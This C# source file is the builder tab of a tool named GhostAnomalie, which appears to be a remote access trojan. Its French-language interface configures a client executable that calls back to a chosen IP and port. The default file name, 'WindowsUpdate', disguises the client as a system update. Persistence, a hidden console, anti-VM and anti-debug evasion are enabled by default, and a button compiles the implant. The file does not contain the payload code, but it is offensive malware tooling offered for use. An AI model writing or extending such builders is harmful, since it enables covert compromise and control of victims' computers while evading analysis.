using GhostAnomalie.Common.Utils;
using GhostAnomalie.Server.Controls;
using GhostAnomalie.Server.Utils;
using System.Diagnostics;
using System.Text;

namespace GhostAnomalie.Server.Forms
{
    public partial class BuilderTab : UserControl
    {
        private MainForm _mainForm;

        // Contrôles
        private CustomTextBox _txtIp;
        private CustomTextBox _txtPort;
        private CustomTextBox _txtPassword;
        private CustomTextBox _txtClientName;
        private CustomTextBox _txtFileName;
        private CheckBox _chkPersist;
        private CheckBox _chkStartup;
        private CheckBox _chkHide;
        private CheckBox _chkAntiVM;
        private CheckBox _chkAntiDebug;
        private CustomButton _btnGenerate;
        private RichTextBox _txtLogs;
        private Label _lblStatus;
        private ProgressBar _progressBar;

        public BuilderTab()
        {
            InitializeComponent();
        }

        public void Initialize(MainForm mainForm)
        {
            _mainForm = mainForm;
        }

        private void InitializeComponent()
        {
            this.BackColor = DarkTheme.BackColor;

            // ===== LEFT PANEL =====
            var leftPanel = new Panel
            {
                Dock = DockStyle.Left,
                Width = 450,
                BackColor = DarkTheme.PanelColor,
                Padding = new Padding(10)
            };

            // === Config Group ===
            var configGroup = new GroupBox
            {
                Text = "⚙️ CONFIGURATION DU CLIENT",
                ForeColor = DarkTheme.TextColor,
                BackColor = DarkTheme.BackColor,
                Dock = DockStyle.Top,
                Height = 250,
                Padding = new Padding(5)
            };

            // IP
            var lblIp = new Label
            {
                Text = "🌐 IP du serveur:",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(10, 28),
                AutoSize = true
            };

            _txtIp = new CustomTextBox
            {
                Text = "127.0.0.1",
                Location = new Point(150, 25),
                Width = 250,
                Font = DarkTheme.MonospaceFont
            };

            // Port
            var lblPort = new Label
            {
                Text = "🔌 Port:",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(10, 58),
                AutoSize = true
            };

            _txtPort = new CustomTextBox
            {
                Text = Constants.DefaultPort.ToString(),
                Location = new Point(150, 55),
                Width = 100,
                Font = DarkTheme.MonospaceFont
            };

            // Password
            var lblPassword = new Label
            {
                Text = "🔑 Mot de passe:",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(10, 88),
                AutoSize = true
            };

            _txtPassword = new CustomTextBox
            {
                Text = Constants.DefaultPassword,
                Location = new Point(150, 85),
                Width = 200,
                Font = DarkTheme.MonospaceFont
            };

            // Client Name
            var lblClientName = new Label
            {
                Text = "👤 Nom du client:",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(10, 118),
                AutoSize = true
            };

            _txtClientName = new CustomTextBox
            {
                Text = "GhostClient",
                Location = new Point(150, 115),
                Width = 200,
                Font = DarkTheme.MonospaceFont
            };

            // File Name
            var lblFileName = new Label
            {
                Text = "📁 Nom du fichier:",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(10, 148),
                AutoSize = true
            };

            _txtFileName = new CustomTextBox
            {
                Text = "WindowsUpdate",
                Location = new Point(150, 145),
                Width = 200,
                Font = DarkTheme.MonospaceFont
            };

            var lblInfo = new Label
            {
                Text = "💡 Le client généré se connectera à cette IP",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(10, 185),
                AutoSize = true,
                Font = new Font("Segoe UI", 8)
            };

            configGroup.Controls.Add(lblIp);
            configGroup.Controls.Add(_txtIp);
            configGroup.Controls.Add(lblPort);
            configGroup.Controls.Add(_txtPort);
            configGroup.Controls.Add(lblPassword);
            configGroup.Controls.Add(_txtPassword);
            configGroup.Controls.Add(lblClientName);
            configGroup.Controls.Add(_txtClientName);
            configGroup.Controls.Add(lblFileName);
            configGroup.Controls.Add(_txtFileName);
            configGroup.Controls.Add(lblInfo);

            // === Options Group ===
            var optionsGroup = new GroupBox
            {
                Text = "🛡️ OPTIONS",
                ForeColor = DarkTheme.TextColor,
                BackColor = DarkTheme.BackColor,
                Dock = DockStyle.Top,
                Height = 140,
                Padding = new Padding(5)
            };

            _chkPersist = new CheckBox
            {
                Text = "🔄 Persistance (Registre Run)",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(15, 25),
                AutoSize = true,
                Checked = true
            };

            _chkStartup = new CheckBox
            {
                Text = "🚀 Démarrage automatique (Startup)",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(15, 50),
                AutoSize = true,
                Checked = true
            };

            _chkHide = new CheckBox
            {
                Text = "👻 Mode furtif (console cachée)",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(15, 75),
                AutoSize = true,
                Checked = true
            };

            _chkAntiVM = new CheckBox
            {
                Text = "🛡️ Anti-VM (détection sandbox)",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(250, 25),
                AutoSize = true,
                Checked = true
            };

            _chkAntiDebug = new CheckBox
            {
                Text = "🔍 Anti-Debug",
                ForeColor = DarkTheme.SecondaryText,
                BackColor = Color.Transparent,
                Location = new Point(250, 50),
                AutoSize = true,
                Checked = true
            };

            optionsGroup.Controls.Add(_chkPersist);
            optionsGroup.Controls.Add(_chkStartup);
            optionsGroup.Controls.Add(_chkHide);
            optionsGroup.Controls.Add(_chkAntiVM);
            optionsGroup.Controls.Add(_chkAntiDebug);

            // === Generate Button ===
            var btnPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 80,
                BackColor = Color.Transparent,
                Padding = new Padding(0, 10, 0, 0)
            };

            _btnGenerate = new CustomButton
            {
                Text = "🔥 GENERER CLIENT .EXE",
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(255, 68, 0),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 14, FontStyle.Bold),
                Height = 50
            };
            _btnGenerate.Click += BtnGenerate_Click;

            _lblStatus = new Label
            {
                Text = "✅ Prêt à générer",
                ForeColor = DarkTheme.TextColor,
                BackColor = Color.Transparent,
                Dock = DockStyle.Bottom,
                Height = 25,
                TextAlign = ContentAlignment.MiddleCenter
            };

            _progressBar = new ProgressBar
            {
                Dock = DockStyle.Bottom,
                Height = 8,
                Style = ProgressBarStyle.Marquee,
                Visible = false
            };

            btnPanel.Controls.Add(_btnGenerate);
            btnPanel.Controls.Add(_lblStatus);
            btnPanel.Controls.Add(_progressBar);

            leftPanel.Controls.Add(btnPanel);
            leftPanel.Controls.Add(optionsGroup);
            leftPanel.Controls.Add(configGroup);
            this.Controls.Add(leftPanel);

            // ===== RIGHT PANEL (Logs) =====
            var rightPanel = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = DarkTheme.BackColor,
                Padding = new Padding(10)
            };

            var logGroup = new GroupBox
            {
                Text = "📝 LOGS DE GÉNÉRATION",
                ForeColor = DarkTheme.TextColor,
                BackColor = DarkTheme.BackColor,
                Dock = DockStyle.Fill,
                Padding = new Padding(5)
            };

            _txtLogs = new RichTextBox
            {
                Dock = DockStyle.Fill,
                BackColor = DarkTheme.BackColor,
                ForeColor = DarkTheme.TextColor,
                Font = DarkTheme.MonospaceFont,
                ReadOnly = true,
                BorderStyle = BorderStyle.None
            };

            logGroup.Controls.Add(_txtLogs);
            rightPanel.Controls.Add(logGroup);
            this.Controls.Add(rightPanel);
        }

        // ============================================================
        // ÉVÉNEMENTS
        // ============================================================

        private async void BtnGenerate_Click(object? sender, EventArgs e)
        {
            try
            {
                _btnGenerate.Enabled = false;
                _progressBar.Visible = true;
                _lblStatus.Text = "⏳ Génération en cours...";
                _lblStatus.ForeColor = DarkTheme.WarningColor;

                // Récupérer les valeurs
                var ip = _txtIp.Text;
                var port = int.Parse(_txtPort.Text);
                var password = _txtPassword.Text;
                var clientName = _txtClientName.Text;
                var fileName = _txtFileName.Text;
                var persist = _chkPersist.Checked;
                var startup = _chkStartup.Checked;
                var hide = _chkHide.Checked;
                var antiVM = _chkAntiVM.Checked;
                var antiDebug = _chkAntiDebug.Checked;

                Log($"🔥 Génération du client '{fileName}'...");
                Log($"📡 IP: {ip}:{port}");
                Log($"👤 Nom: {clientName}");

                // Générer le code client
                var codeGenerator = new CodeGenerator();
                var result = await codeGenerator.Generate(
                    ip, port, password, clientName, fileName,
                    persist, startup, hide, antiVM, antiDebug
                );

                if (result.Success)
                {
                    _lblStatus.Text = $"✅ Client généré: {result.FilePath}";
                    _lblStatus.ForeColor = DarkTheme.TextColor;
                    Log($"✅ Client généré avec succès !");
                    Log($"📁 {result.FilePath}");

                    // Ouvrir le dossier
                    Process.Start("explorer.exe", Path.GetDirectoryName(result.FilePath));
                }
                else
                {
                    _lblStatus.Text = $"❌ Erreur: {result.Error}";
                    _lblStatus.ForeColor = DarkTheme.ErrorColor;
                    Log($"❌ Erreur: {result.Error}");
                }
            }
            catch (Exception ex)
            {
                _lblStatus.Text = $"❌ Erreur: {ex.Message}";
                _lblStatus.ForeColor = DarkTheme.ErrorColor;
                Log($"❌ Erreur: {ex.Message}");
            }
            finally
            {
                _btnGenerate.Enabled = true;
                _progressBar.Visible = false;
            }
        }

        // ============================================================
        // MÉTHODES
        // ============================================================

        public void Log(string message)
        {
            if (_txtLogs.InvokeRequired)
            {
                _txtLogs.Invoke(() => Log(message));
                return;
            }

            var timestamp = DateTime.Now.ToString("HH:mm:ss");
            _txtLogs.AppendText($"[{timestamp}] {message}\n");
            _txtLogs.ScrollToCaret();
        }
    }
}
